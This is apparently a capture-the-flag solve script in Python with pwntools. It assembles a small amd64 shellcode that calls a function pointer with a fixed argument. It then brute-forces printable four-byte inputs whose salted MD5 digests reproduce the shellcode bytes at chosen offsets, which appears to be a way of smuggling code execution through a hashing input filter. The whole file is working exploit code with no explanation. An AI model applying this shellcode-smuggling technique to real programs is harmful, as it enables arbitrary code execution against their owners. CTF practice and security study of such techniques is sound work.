from hashlib import md5
from pwn import *

enc = [i for i in range(64)]
fin = [0] * 16
arr = [8, 2, 7, 1]

for i in range(4):
    for j in range(4):
        fin[i + 4 * j] = enc[i + 16 * j + arr[j]]

for i in range(len(fin)):
    fin[i] %= 16
# fin = [8, 9, 10, 11, 2, 3, 4, 5, 7, 8, 9, 10, 1, 2, 3, 4]

context.arch = "amd64"
shellcode = asm(
    """
    mov rsi, rdi
    mov rdi, 0x7b3dc26f1
    call rsi
    """
)
shellcode += b"\x90"
salt = [b"GpLaMjEW", b"pVOjnnmk", b"RGiledp6", b"Mvcezxls"]
for i in range(4):
    for a in range(33, 123, 1):
        for b in range(33, 123, 1):
            for c in range(33, 123, 1):
                for d in range(33, 123, 1):
                    enc_block = (
                        a.to_bytes(1, "big")
                        + b.to_bytes(1, "big")
                        + c.to_bytes(1, "big")
                        + d.to_bytes(1, "big")
                    )
                    md5_sum = md5(enc_block + salt[i]).digest()
                    match = 0
                    # print(enc_block)
                    if i != 3:
                        for idx, pos in enumerate(fin[i * 4 : i * 4 + 4]):
                            if md5_sum[pos] == shellcode[idx + i * 4]:
                                match += 1
                        if match == 4:
                            print("The {}: {}".format(i, enc_block))
                    else:
                        for idx, pos in enumerate(fin[i * 4 : i * 4 + 3]):
                            if md5_sum[pos] == shellcode[idx + i * 4]:
                                match += 1
                        if match == 3:
                            print("The {}: {}".format(i, enc_block))
